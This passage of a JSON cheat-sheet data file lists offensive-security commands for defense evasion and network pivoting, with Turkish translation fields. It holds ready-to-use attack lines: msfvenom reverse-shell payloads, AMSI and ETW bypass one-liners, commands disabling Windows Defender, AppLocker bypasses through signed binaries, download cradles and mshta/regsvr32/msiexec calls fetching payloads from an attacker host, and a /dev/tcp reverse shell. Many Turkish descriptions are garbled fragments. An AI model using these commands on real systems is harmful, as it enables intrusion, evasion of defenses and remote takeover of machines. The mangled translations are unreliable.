      }
    ],
    "name_tr": "Kimlik Bilgisi Saldırıları ve Hash Kırma",
    "description_tr": "Perform online brute force, offline hash cracking, credential dumping, and password spraying to compromise authentication mechanisms."
  },
  {
    "id": "av-bypass",
    "name": "Defense Evasion & AV Bypass",
    "icon": "🛡️",
    "description": "Bypass antivirus, AMSI, AppLocker, Constrained Language Mode, and other security controls to execute payloads undetected.",
    "subcategories": [
      {
        "name": "Encoding & Packing",
        "commands": [
          {
            "title": "Msfvenom Shikata Encoding",
            "desc": "Encode payload with shikata_ga_nai",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kodla: a payload shikata_ga_nai ile"
          },
          {
            "title": "Msfvenom Multi-Encoder",
            "desc": "Chain multiple encoders",
            "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -e x86/alpha_upper -i 3 -f exe -o multi_encoded.exe",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Chamultiple encoders içinde"
          },
          {
            "title": "UPX Packing",
            "desc": "Pack executable with UPX to change signature",
            "cmd": "upx --best -o packed.exe original.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Pack executable UPX change signature ile'e"
          },
          {
            "title": "Veil-Evasion Framework",
            "desc": "Generate AV-evasive payloads with Veil",
            "cmd": "veil",
            "tags": [
              "tool"
            ],
            "note": "Interactive tool — select payload type and configure options",
            "desc_tr": "Oluştur: AV-evasive payloads Veil ile"
          },
          {
            "title": "Shellter Injection",
            "desc": "Inject payload into legitimate PE executable",
            "cmd": "shellter",
            "tags": [
              "tool"
            ],
            "note": "Interactive — choose Auto mode, select target PE, configure payload",
            "desc_tr": "Enjekte et: payload inlegitimate PE executable'e"
          },
          {
            "title": "Donut Shellcode from PE/DLL",
            "desc": "Convert PE/.NET/DLL to position-independent shellcode",
            "cmd": "donut -i payload.exe -o loader.bin",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Dönüştür: PE/.NET/DLL position-independent shellcode'e"
          },
          {
            "title": "Donut with Parameters",
            "desc": "Donut shellcode with custom class/method",
            "cmd": "donut -i payload.exe -o loader.bin -e 3 -b 1",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Donut shellcode özel class/method ile"
          }
        ],
        "name_tr": "Encoding & Packing"
      },
      {
        "name": "AMSI Bypass",
        "commands": [
          {
            "title": "AMSI Bypass (Reflection)",
            "desc": "Disable AMSI via reflection in PowerShell",
            "cmd": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Devre dışı bırak: AMSI reflectiPowerShell üzerinden üzerinde içinde"
          },
          {
            "title": "AMSI Bypass (Patching)",
            "desc": "Patch AMSI in memory",
            "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$a.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)",
            "tags": [
              "essential"
            ],
            "note": "Obfuscated to avoid string detection",
            "desc_tr": "Yamala: AMSI memory içinde"
          },
          {
            "title": "AMSI Bypass (Matt Graeber)",
            "desc": "Force AMSI initialization failure",
            "cmd": "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x5)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Zorla: AMSI initializatifailure üzerinde"
          },
          {
            "title": "AMSI Bypass (PowerShell Downgrade)",
            "desc": "Use PowerShell v2 which has no AMSI",
            "cmd": "powershell -version 2",
            "tags": [
              "essential"
            ],
            "note": "Only works if .NET 2.0 is still installed",
            "desc_tr": "Use PowerShell v2 which has no AMSI"
          },
          {
            "title": "AMSI Bypass (Base64 Concatenation)",
            "desc": "Split and concatenate AMSI bypass to evade detection",
            "cmd": "$a='System.Management.Automation.A';$b='msi';$u='Utils';$t=[Ref].Assembly.GetType($a+$b+$u);$f=$t.GetField('a'+$b+'InitFailed','NonPublic,Static');$f.SetValue($null,$true)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Split and concatenate AMSI bypass evade detection'e"
          }
        ],
        "name_tr": "AMSI Bypass"
      },
      {
        "name": "PowerShell Evasion",
        "commands": [
          {
            "title": "Bypass Execution Policy (Bypass)",
            "desc": "Run script bypassing execution policy",
            "cmd": "powershell -ep bypass -File script.ps1",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: script bypassing executipolicy üzerinde"
          },
          {
            "title": "Bypass Execution Policy (Unrestricted)",
            "desc": "Set unrestricted execution policy",
            "cmd": "powershell -ExecutionPolicy Unrestricted -File script.ps1",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ayarla: unrestricted executipolicy üzerinde"
          },
          {
            "title": "Bypass via Pipe",
            "desc": "Bypass execution policy by piping script",
            "cmd": "Get-Content script.ps1 | powershell -nop -",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: executipolicy by piping script üzerinde"
          },
          {
            "title": "Bypass via Encoded Command",
            "desc": "Execute base64-encoded PowerShell command",
            "cmd": "powershell -nop -enc <BASE64_COMMAND>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: base64-encoded PowerShell command"
          },
          {
            "title": "Bypass via Download Cradle (IEX)",
            "desc": "Download and execute script in memory",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: and execute script memory içinde"
          },
          {
            "title": "Bypass via Download Cradle (IWR)",
            "desc": "Download and invoke using Invoke-WebRequest",
            "cmd": "powershell -nop -c \"IEX(IWR 'http://<LHOST>/script.ps1' -UseBasicParsing)\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: and invoke Invoke-WebRequest kullanarak"
          },
          {
            "title": "Invoke-Obfuscation",
            "desc": "Obfuscate PowerShell scripts to evade detection",
            "cmd": "Import-Module ./Invoke-Obfuscation.psd1; Invoke-Obfuscation",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Interactive menu — choose TOKEN, STRING, or ENCODING obfuscation",
            "desc_tr": "gizleme/karmaşıklaştırma PowerShell scripts evade detection'e"
          },
          {
            "title": "PowerShell Constrained Language Check",
            "desc": "Check if CLM is enabled",
            "cmd": "$ExecutionContext.SessionState.LanguageMode",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if CLM is enabled"
          },
          {
            "title": "Disable Defender",
            "desc": "Disable real-time monitoring",
            "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "tags": [
              "essential"
            ],
            "note": "Requires admin",
            "desc_tr": "Devre dışı bırak: real-time monitoring"
          },
          {
            "title": "Defender Exclusion",
            "desc": "Add path exclusion",
            "cmd": "Add-MpPreference -ExclusionPath 'C:\\temp'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ekle: path exclusion"
          },
          {
            "title": "ETW Patch",
            "desc": "Patch ETW to evade logging",
            "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');$b=$a.GetValue($null);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($b,0)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yamala: ETW evade logging'e"
          }
        ],
        "name_tr": "PowerShell Evasion"
      },
      {
        "name": "AppLocker & CLM Bypass",
        "commands": [
          {
            "title": "AppLocker Policy Check",
            "desc": "View current AppLocker policy",
            "cmd": "Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections",
            "tags": [
              "essential"
            ],
            "desc_tr": "View mevcut AppLocker policy"
          },
          {
            "title": "MSBuild AppLocker Bypass",
            "desc": "Execute C# code via MSBuild (whitelisted)",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj",
            "tags": [
              "essential"
            ],
            "note": "Create .csproj file with embedded C# shellcode runner",
            "desc_tr": "Çalıştır: C# code MSBuild (whitelisted) üzerinden"
          },
          {
            "title": "InstallUtil AppLocker Bypass",
            "desc": "Execute .NET assembly via InstallUtil",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: .NET assembly InstallUtil üzerinden"
          },
          {
            "title": "Regsvcs AppLocker Bypass",
            "desc": "Execute .NET assembly via regsvcs",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: .NET assembly regsvcs üzerinden"
          },
          {
            "title": "Regasm AppLocker Bypass",
            "desc": "Execute .NET assembly via regasm",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: .NET assembly regasm üzerinden"
          },
          {
            "title": "CLM Bypass via PSBypassCLM",
            "desc": "Bypass Constrained Language Mode with custom runspace",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PSBypassCLM.exe",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Atla: Constrained Language Mode özel runspace ile"
          }
        ],
        "name_tr": "AppLocker & CLM Bypass"
      },
      {
        "name": "Binary Obfuscation",
        "commands": [
          {
            "title": "Certutil Download",
            "desc": "Download files using Windows certutil",
            "cmd": "certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\temp\\shell.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: files Windows certutil kullanarak"
          },
          {
            "title": "Certutil Base64 Decode",
            "desc": "Decode base64-encoded payload with certutil",
            "cmd": "certutil -decode encoded.b64 payload.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çöz: zme base64-encoded payload certutil ile"
          },
          {
            "title": "MSHTA Execution",
            "desc": "Execute HTA payload via mshta",
            "cmd": "mshta http://<LHOST>/shell.hta",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: HTA payload mshta üzerinden"
          },
          {
            "title": "MSHTA Inline VBScript",
            "desc": "Execute inline VBScript via mshta",
            "cmd": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"\", 0:close\")",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: inline VBScript mshta üzerinden"
          },
          {
            "title": "Rundll32 Execution",
            "desc": "Execute DLL payload via rundll32",
            "cmd": "rundll32.exe shell.dll,EntryPoint",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: DLL payload rundll32 üzerinden"
          },
          {
            "title": "Wscript Execution",
            "desc": "Execute script via Windows Script Host",
            "cmd": "wscript /e:vbscript C:\\temp\\payload.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: script Windows Script Host üzerinden"
          },
          {
            "title": "Cscript Execution",
            "desc": "Execute script via cscript",
            "cmd": "cscript //nologo C:\\temp\\payload.vbs",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: script cscript üzerinden"
          },
          {
            "title": "Chameleon Python Obfuscator",
            "desc": "Obfuscate Python scripts for AV evasion",
            "cmd": "python3 chameleon.py -f payload.py -o obfuscated.py",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "gizleme/karmaşıklaştırma Pythscripts for AV evasion üzerinde"
          },
          {
            "title": "Nimcrypt2 PE Packer",
            "desc": "Pack and encrypt PE with Nim loader",
            "cmd": "nimcrypt2 -f shell.exe -t csharp -o packed.exe",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Pack and encrypt PE Nim loader ile"
          },
          {
            "title": "Regsvr32 AppLocker Bypass",
            "desc": "Execute COM scriptlet via regsvr32",
            "cmd": "regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll",
            "tags": [
              "advanced"
            ],
            "note": "Host .sct file on attacker with embedded VBScript/JScript",
            "desc_tr": "Çalıştır: COM scriptlet regsvr32 üzerinden"
          },
          {
            "title": "XSL Script Processing",
            "desc": "Execute code via WMIC XSL transform",
            "cmd": "wmic os get /FORMAT:\"http://<LHOST>/payload.xsl\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: code WMIC XSL transform üzerinden"
          },
          {
            "title": "Disable Windows Defender (Admin)",
            "desc": "Disable real-time protection if admin",
            "cmd": "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
            "tags": [
              "essential"
            ],
            "note": "Requires local admin privileges",
            "desc_tr": "Devre dışı bırak: real-time protectiif admüzerinde içinde"
          },
          {
            "title": "Add Defender Exclusion Path",
            "desc": "Add exclusion to avoid scanning payload directory",
            "cmd": "powershell -c \"Add-MpPreference -ExclusionPath 'C:\\Temp'\"",
            "tags": [
              "essential"
            ],
            "note": "Requires local admin privileges",
            "desc_tr": "Ekle: exclusiavoid tarama payload directory üzerinde'e"
          },
          {
            "title": "Add Defender Exclusion Process",
            "desc": "Exclude a process from Defender scanning",
            "cmd": "powershell -c \"Add-MpPreference -ExclusionProcess 'payload.exe'\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Exclude a process Defender tarama üzerinden"
          }
        ],
        "name_tr": "Binary Obfuscation"
      },
      {
        "name": "Living Off The Land (LOLBins)",
        "commands": [
          {
            "title": "LOL mshta",
            "desc": "Execute HTA payload",
            "cmd": "mshta http://<ATTACKER_IP>/payload.hta",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: HTA payload"
          },
          {
            "title": "LOL regsvr32",
            "desc": "Execute SCT file",
            "cmd": "regsvr32 /s /n /u /i:http://<ATTACKER_IP>/payload.sct scrobj.dll",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: SCT file"
          },
          {
            "title": "LOL cmstp",
            "desc": "Execute INF payload",
            "cmd": "cmstp.exe /ni /s payload.inf",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: INF payload"
          },
          {
            "title": "LOL forfiles",
            "desc": "Execute via forfiles",
            "cmd": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c <COMMAND>\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: forfiles üzerinden"
          },
          {
            "title": "LOL msiexec",
            "desc": "Execute MSI remotely",
            "cmd": "msiexec /q /i http://<ATTACKER_IP>/payload.msi",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: MSI remotely"
          },
          {
            "title": "LOL bash.exe (WSL)",
            "desc": "Execute via WSL",
            "cmd": "bash.exe -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: WSL üzerinden"
          }
        ],
        "name_tr": "Living Off The Land (LOLBins)"
      }
    ],
    "name_tr": "Savunma Atlatma ve AV Bypass",
    "description_tr": "Bypass antivirus, AMSI, AppLocker, Constrained Language Mode, and other security controls to execute payloads undetected."
  },
  {
    "id": "pivoting",
    "name": "Network Pivoting & Traffic Routing",
    "icon": "🔀",
    "description": "Route traffic through compromised hosts to reach internal networks using SSH tunnels, SOCKS proxies, and specialized pivoting tools.",
    "subcategories": [
      {
        "name": "SSH Forwarding",
        "commands": [
          {
            "title": "SSH Local Port Forward",
            "desc": "Forward local port to remote service through SSH",
            "cmd": "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "note": "Access remote service at localhost:<LOCAL_PORT>",
            "desc_tr": "Yönlendir: yerel port uzak service SSH'e üzerinden"
          },
          {
            "title": "SSH Remote Port Forward",
            "desc": "Expose attacker service to internal network",
            "cmd": "ssh -R <PIVOT_PORT>:<ATTACKER_IP>:<ATTACKER_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Expose attacker service internal network'e"
          },
          {
            "title": "SSH Dynamic SOCKS Proxy",
            "desc": "Create SOCKS proxy through SSH tunnel",
            "cmd": "ssh -D 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "note": "Configure proxychains to use socks5 127.0.0.1 1080",
            "desc_tr": "Oluştur: SOCKS vekil sunucu (proxy) SSH tunnel üzerinden"
          },
          {
            "title": "SSH Jump Host",
            "desc": "SSH through a jump host to reach final target",
            "cmd": "ssh -J <USER>@<PIVOT_IP> <USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "SSH a jump host reach final target'e üzerinden"
          },
          {
            "title": "SSH Local Forward (Background)",
            "desc": "Run SSH tunnel in background",
            "cmd": "ssh -f -N -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: SSH tunnel background içinde"
          },
          {
            "title": "SSH Dynamic SOCKS (Background)",
            "desc": "Background SOCKS proxy",
            "cmd": "ssh -f -N -D 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Background SOCKS vekil sunucu (proxy)"
          },
          {
            "title": "SSHuttle VPN-like Tunnel",
            "desc": "Route traffic through SSH like a VPN",
            "cmd": "sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_SUBNET>/24",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Yönlendir: traffic SSH like a VPN üzerinden"
          },
          {
            "title": "SSHuttle Exclude Subnet",
            "desc": "Route with excluded networks",
            "cmd": "sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_SUBNET>/24 -x <PIVOT_IP>/32",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: excluded networks ile"
          },
          {
            "title": "SSH with Key and Forward",
            "desc": "SSH tunnel using key authentication",
            "cmd": "ssh -i id_rsa -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP> -fN",
            "tags": [
              "essential"
            ],
            "desc_tr": "SSH tunnel key kimlik doğrulama kullanarak"
          },
          {
            "title": "SSH Multi-Hop Jump",
            "desc": "Jump through multiple hosts",
            "cmd": "ssh -J <USER1>@<JUMP1>,<USER2>@<JUMP2> <USER3>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Jump multiple hosts üzerinden"
          },
          {
            "title": "SSH Background SOCKS",
            "desc": "Background SOCKS proxy",
            "cmd": "ssh -NfD 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Background SOCKS vekil sunucu (proxy)"
          },
          {
            "title": "Autossh Persistent",
            "desc": "Auto-reconnecting tunnel",
            "cmd": "autossh -M 0 -o 'ServerAliveInterval 30' -NfD 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Auto-reconnecting tunnel"
          },
          {
            "title": "sshpass Inline",
            "desc": "SSH with inline password",
            "cmd": "sshpass -p '<PASS>' ssh -o StrictHostKeyChecking=no <USER>@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "SSH inline password ile"
          }
        ],
        "name_tr": "SSH Forwarding"
      },
      {
        "name": "Chisel Tunnels",
        "commands": [
          {
            "title": "Chisel Server (Attacker)",
            "desc": "Start chisel server on attacker machine",
            "cmd": "chisel server --reverse --port 8080",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Başlat: chisel server attacker machine üzerinde"
          },
          {
            "title": "Chisel SOCKS Proxy (Client)",
            "desc": "Create reverse SOCKS proxy from target",
            "cmd": "./chisel client <ATTACKER_IP>:8080 R:socks",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Creates SOCKS5 proxy on attacker at 127.0.0.1:1080",
            "desc_tr": "Oluştur: reverse SOCKS vekil sunucu (proxy) target üzerinden"
          },
          {
            "title": "Chisel Reverse Port Forward",
            "desc": "Forward specific port back to attacker",
            "cmd": "./chisel client <ATTACKER_IP>:8080 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Yönlendir: belirli port back attacker'e"
          },
          {
            "title": "Chisel Forward Port",
            "desc": "Forward local port to remote service",
            "cmd": "./chisel client <ATTACKER_IP>:8080 <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: yerel port uzak service'e"
          },
          {
            "title": "Chisel Multiple Tunnels",
            "desc": "Create multiple tunnels in single connection",
            "cmd": "./chisel client <ATTACKER_IP>:8080 R:socks R:8888:<TARGET_IP>:80 R:4444:<TARGET_IP>:445",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oluştur: multiple tunnels single connection içinde"
          }
        ],
        "name_tr": "Chisel Tunnels"
      },
      {
        "name": "Ligolo-ng",
        "commands": [
          {
            "title": "Ligolo-ng Create TUN Interface",
            "desc": "Create TUN interface on attacker (Linux)",
            "cmds": [
              "sudo ip tuntap add user $(whoami) mode tun ligolo",
              "sudo ip link set ligolo up"
            ],
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: TUN interface attacker (Linux) üzerinde"
          },
          {
            "title": "Ligolo-ng Start Proxy",
            "desc": "Start ligolo-ng proxy on attacker",
            "cmd": "sudo ./proxy -selfcert -laddr 0.0.0.0:11601",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Başlat: ligolo-ng vekil sunucu (proxy) attacker üzerinde"
          },
          {
            "title": "Ligolo-ng Agent Connect",
            "desc": "Run agent on compromised host to connect back",
            "cmd": "./agent -connect <ATTACKER_IP>:11601 -ignore-cert",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çalıştır: agent compromised host connect back üzerinde'e"
          },
          {
            "title": "Ligolo-ng Add Route",
            "desc": "Add route to access internal network",
            "cmd": "sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Ekle: route access internal network'e"
          },
          {
            "title": "Ligolo-ng Start Tunnel",
            "desc": "Start the tunnel from ligolo proxy console",
            "cmds": [
              "# In ligolo proxy console:",
              "session",
              "# Select the agent session",
              "start"
            ],
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Başlat: the tunnel ligolo vekil sunucu (proxy) console üzerinden"
          },
          {
            "title": "Ligolo-ng Add Listener",
            "desc": "Add a listener on the agent for reverse connections",
            "cmd": "# In ligolo proxy console:\nlistener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT> --tcp",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Allows catching reverse shells through the tunnel",
            "desc_tr": "Ekle: a listener the agent for reverse connections üzerinde"
          },
          {
            "title": "Ligolo-ng Windows Agent",
            "desc": "Run agent on compromised Windows host",
            "cmd": "agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çalıştır: agent compromised Windows host üzerinde"
          },
          {
            "title": "Ligolo-ng List Sessions",
            "desc": "List active agent sessions in proxy console",
            "cmd": "# In ligolo proxy console:\nsession",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: aktif agent oturumları proxy konsolunda"
          },
          {
            "title": "Ligolo-ng List Interfaces",
            "desc": "Show network interfaces of connected agent",
            "cmd": "# In ligolo proxy console (after selecting session):\nifconfig",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: bağlı agent'ın ağ arayüzlerini"
          },
          {
            "title": "Ligolo-ng Delete Route",
            "desc": "Remove route when done with tunnel",
            "cmd": "sudo ip route del <INTERNAL_SUBNET>/24 dev ligolo",
            "tags": [
              "tool"
            ],
            "desc_tr": "Sil: tünel bittiğinde route'u kaldır"
          },
          {
            "title": "Ligolo-ng Double Pivot Setup",
            "desc": "Add second TUN interface and route for double pivot",
            "cmds": [
              "sudo ip tuntap add user $(whoami) mode tun ligolo2",
              "sudo ip link set ligolo2 up",
              "sudo ip route add <SECOND_SUBNET>/24 dev ligolo2"
            ],
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Çift pivot için ikinci TUN interface ve route ekle"
          },
          {
            "title": "Ligolo-ng Stop Tunnel",
            "desc": "Stop the active tunnel in proxy console",
            "cmd": "# In ligolo proxy console:\nstop",
            "tags": [
              "essential"
            ],
            "desc_tr": "Aktif tüneli durdur proxy konsolunda"
          },
          {
            "title": "Ligolo-ng Listener List",
            "desc": "List all active listeners on agent",
            "cmd": "# In ligolo proxy console:\nlistener_list",
            "tags": [
              "tool"
            ],
            "desc_tr": "Agent üzerindeki aktif listener'ları listele"
          },
          {
            "title": "Ligolo-ng Transfer File via Listener",
            "desc": "Use listener to serve files from attacker through pivot",
            "cmds": [
              "# On attacker: python3 -m http.server 8000",
              "# In ligolo console: listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp",
              "# On internal host: curl http://<PIVOT_IP>:8000/file.exe -o file.exe"
            ],
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Listener ile pivot üzerinden dosya transfer et"
          }
        ],
        "name_tr": "Ligolo-ng"
      },
      {
        "name": "SOCKS Proxying",
        "commands": [
          {
            "title": "Proxychains Configuration",
            "desc": "Configure proxychains for SOCKS proxy",
            "cmds": [
              "# Edit /etc/proxychains4.conf:",
              "# Add at the bottom:",
              "socks5 127.0.0.1 1080"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Yapılandır: proxychains for SOCKS vekil sunucu (proxy)"
          },
          {
            "title": "Proxychains Nmap",
            "desc": "Run nmap through SOCKS proxy",
            "cmd": "proxychains -q nmap -sT -Pn -n <TARGET_IP> -p 21,22,80,443,445,3389",
            "tags": [
              "essential"
            ],
            "note": "Only TCP connect scan (-sT) works through proxychains",
            "desc_tr": "Çalıştır: nmap SOCKS vekil sunucu (proxy) üzerinden"
          },
          {
            "title": "Proxychains Curl",
            "desc": "Access web service through proxy",
            "cmd": "proxychains -q curl http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Access web service vekil sunucu (proxy) üzerinden"
          },
          {
            "title": "Proxychains Evil-WinRM",
            "desc": "Connect to WinRM through proxy",
            "cmd": "proxychains -q evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: WinRM vekil sunucu (proxy)'e üzerinden"
          },
          {
            "title": "Proxychains CrackMapExec",
            "desc": "Run CrackMapExec through proxy",
            "cmd": "proxychains -q crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: CrackMapExec vekil sunucu (proxy) üzerinden"
          },
          {
            "title": "Proxychains SMBClient",
            "desc": "Connect to SMB share through proxy",
            "cmd": "proxychains -q smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: SMB share vekil sunucu (proxy)'e üzerinden"
          },
          {
            "title": "Proxychains SSH",
            "desc": "SSH through SOCKS proxy",
            "cmd": "proxychains -q ssh <USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "SSH SOCKS vekil sunucu (proxy) üzerinden"
          },
          {
            "title": "Proxychains RDP",
            "desc": "RDP through SOCKS proxy",
            "cmd": "proxychains -q xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>",
            "tags": [
              "tool"
            ],
            "desc_tr": "RDP SOCKS vekil sunucu (proxy) üzerinden"
          },
          {
            "title": "cURL through SOCKS",
            "desc": "HTTP via SOCKS",
            "cmd": "curl --socks5 127.0.0.1:1080 http://<INTERNAL_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "HTTP SOCKS üzerinden"
          },
          {
            "title": "Impacket through Proxy",
            "desc": "Impacket via SOCKS",
            "cmd": "proxychains impacket-psexec <DOMAIN>/<USER>:<PASS>@<INTERNAL_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Impacket SOCKS üzerinden"
          },
          {
            "title": "Evil-WinRM through Proxy",
            "desc": "WinRM via SOCKS",
            "cmd": "proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "WinRM SOCKS üzerinden"
          },
          {
            "title": "CME through Proxy",
            "desc": "CrackMapExec via SOCKS",
            "cmd": "proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "CrackMapExec SOCKS üzerinden"
          },
          {
            "title": "Proxychains NetExec MSSQL",
            "desc": "Access internal MSSQL through SOCKS proxy with NetExec",
            "cmd": "proxychains -q nxc mssql <INTERNAL_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "SOCKS proxy ile dahili MSSQL'e NetExec üzerinden eriş"
          },
          {
            "title": "Proxychains NetExec MSSQL Command",
            "desc": "Execute OS command on internal MSSQL via proxy",
            "cmd": "proxychains -q nxc mssql <INTERNAL_IP> -u <USER> -p '<PASS>' -x 'whoami'",
            "tags": [
              "essential"
            ],
